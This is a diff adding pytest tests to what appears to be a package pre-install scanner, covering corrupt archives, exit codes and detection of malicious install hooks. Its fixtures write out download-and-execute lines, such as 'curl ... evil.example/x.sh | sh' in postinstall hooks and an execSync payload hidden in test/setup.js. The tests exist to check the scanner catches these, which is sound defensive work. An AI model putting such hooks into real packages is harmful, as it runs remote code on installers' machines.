@@ -680,3 +680,118 @@ def test_jsonc_executable_config_is_parsed(tmp_path):
     result = analyze_preflight(root)
 
     assert "agent-config-downloader" in _gating_rules(result)
+
+
+def _truncated_tgz(path: Path) -> None:
+    buf = io.BytesIO()
+    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
+        data = b"x" * 50_000
+        info = tarfile.TarInfo("package/index.js")
+        info.size = len(data)
+        tf.addfile(info, io.BytesIO(data))
+    raw = buf.getvalue()
+    path.write_bytes(raw[: len(raw) // 2])
+
+
+def _encrypted_zip(path: Path) -> None:
+    with zipfile.ZipFile(path, "w") as zf:
+        zf.writestr("a.txt", "hi")
+    raw = bytearray(path.read_bytes())
+    raw[6] |= 1  # general-purpose flag bit 0: encrypted (local header)
+    central = raw.find(b"PK\x01\x02")
+    raw[central + 8] |= 1  # and in the central directory
+    path.write_bytes(bytes(raw))
+
+
+@pytest.mark.parametrize(
+    "name,build",
+    [
+        ("corrupt.tgz", lambda p: p.write_bytes(b"\x1f\x8b" + b"\x00garbage" * 200)),
+        ("truncated.tgz", _truncated_tgz),
+        ("corrupt.zip", lambda p: p.write_bytes(b"PK\x03\x04not-a-zip")),
+        ("encrypted.zip", _encrypted_zip),
+    ],
+)
+def test_unreadable_archive_is_an_error_not_a_crash(tmp_path, capsys, name, build):
+    """A truncated download or a damaged archive used to escape as a traceback
+    with exit 1 — the code for "findings". Nothing was checked, so it is exit 2
+    with a sentence saying so."""
+    archive = tmp_path / name
+    build(archive)
+    code = scan_cmd.run_scan(str(archive), fmt="text", fail_on="critical", tool_version="t")
+    err = capsys.readouterr().err
+    assert code == 2
+    assert "could not be read as an archive" in err and "nothing inside it was checked" in err
+
+
+def test_every_reason_not_to_install_is_printed(tmp_path):
+    """The verdict counts every critical; the list under it used to stop at six
+    per question without a word, so the count and the list disagreed."""
+    files = {
+        f"sub{i}/package.json": json.dumps({
+            "name": f"p{i}", "version": "1.0.0",
+            "scripts": {"postinstall": f"curl -s http://203.0.113.{i}/a.sh | sh"},
+        })
+        for i in range(8)
+    }
+    out = io.StringIO()
+    code = run_scan(str(_tree(tmp_path, files)), fmt="checklist", out=out, err=io.StringIO())
+    text = out.getvalue()
+    assert code == 1
+    assert "8 reasons not to install this yet" in text
+    assert all(f"203.0.113.{i}" in text for i in range(8))
+
+
+_PAYLOAD = "require('child_process').execSync('curl -s https://evil.example/x.sh | sh')\n"
+
+
+def _hook(cmd: str, **extra) -> str:
+    return json.dumps({"name": "x", "version": "1.0.0", "scripts": {"postinstall": cmd}, **extra})
+
+
+@pytest.mark.parametrize("files", [
+    {"package.json": _hook("node test/setup"), "test/setup.js": _PAYLOAD},
+    {"package.json": _hook('node "./test/setup.js"'), "test/setup.js": _PAYLOAD},
+    {"package.json": _hook("node index.js"), "index.js": "require('./test/setup')\n",
+     "test/setup.js": _PAYLOAD},
+    {"package.json": _hook("node .", main="test/setup.js"), "test/setup.js": _PAYLOAD},
+    {"package.json": _hook("node ./lib"), "lib/index.js": _PAYLOAD},
+    {"package.json": _hook("sh scripts/run.sh"), "scripts/run.sh": ". ./test/env.sh\n",
+     "scripts/test/env.sh": "curl -s https://evil.example/x.sh | sh\n"},
+], ids=["extensionless", "quoted", "required", "main", "directory", "sourced"])
+def test_code_an_install_hook_runs_is_scanned_however_it_is_named(tmp_path, files):
+    """Test directories are skipped, except for code an install hook runs. That
+    exception used to hold only for a literal `x.js` in the command, so naming
+    the payload the way node or sh actually accept it kept it out of sight."""
+    result = analyze_preflight(_tree(tmp_path, files))
+    gating = [f for f in result.gating() if f.rule == "download-and-execute"]
+    assert gating, [f"{f.severity}:{f.rule}@{f.where}" for f in result.findings]
+
+
+def test_every_lifecycle_script_npm_install_runs_is_read(tmp_path):
+    """A local `npm install` in a downloaded project also runs preprepare,
+    postprepare and (npm 6) prepublish."""
+    for key in ("prepublish", "preprepare", "postprepare"):
+        root = _tree(tmp_path / key, {"package.json": json.dumps({
+            "name": "x", "version": "1", "scripts": {key: "curl -s https://evil.example/x | sh"},
+        })})
+        assert [f.rule for f in analyze_preflight(root).gating()] == ["install-hook-downloader"], key
+
+
+@pytest.mark.parametrize("pipe", ["python3 -", "sudo -E bash", "node", "perl"])
+def test_download_piped_to_any_interpreter_is_download_and_execute(tmp_path, pipe):
+    root = _tree(tmp_path, {"install.sh": f"#!/bin/sh\ncurl -fsSL https://evil.example/p | {pipe}\n"})
+    assert [f.rule for f in analyze_preflight(root).gating()] == ["download-and-execute"]
+
+
+def test_partial_scan_is_exit_2_whatever_the_threshold(tmp_path, monkeypatch):
+    """Every other command treats incomplete coverage as 2; scan let
+    `--fail-on none` report it as a pass."""
+    from tridelphi import preflight
+
+    monkeypatch.setattr(preflight, "_MAX_FILES", 1)
+    root = _tree(tmp_path, {"a.sh": "echo a\n", "b.sh": "echo b\n", "c.sh": "echo c\n"})
+    for fail_on in ("critical", "none"):
+        code = run_scan(str(root), fmt="checklist", fail_on=fail_on,
+                        out=io.StringIO(), err=io.StringIO())
+        assert code == 2, fail_on
